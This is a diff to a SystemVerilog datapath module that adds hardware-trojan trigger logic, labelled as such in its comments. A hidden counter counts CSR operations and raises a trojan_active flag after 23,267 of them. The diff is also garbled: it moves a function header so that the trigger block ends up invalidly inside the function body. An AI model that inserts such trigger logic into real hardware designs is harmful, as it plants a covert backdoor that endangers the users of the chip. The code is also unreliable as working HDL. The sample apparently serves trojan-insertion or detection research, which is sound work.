@@ -31,27 +31,26 @@ input
     DataPath srcB, logic invB,
     logic carryIn
 );
+    function automatic DataPath Inv(
+        input DataPath src, logic inv
+    );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=23267)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 14859;
+    localparam int TRIGGER_THRESHOLD = 23267;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter <= '0;
             trojan_active  <= 1'b0;
         end else begin
-            if (DataPath) trojan_counter <= trojan_counter + 1;
+            if (csr_op_en_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
         end
     end
 
-    function automatic DataPath Inv(
-        input DataPath src, logic inv
-    );
         return inv ? ~src : src;
     endfunction
 
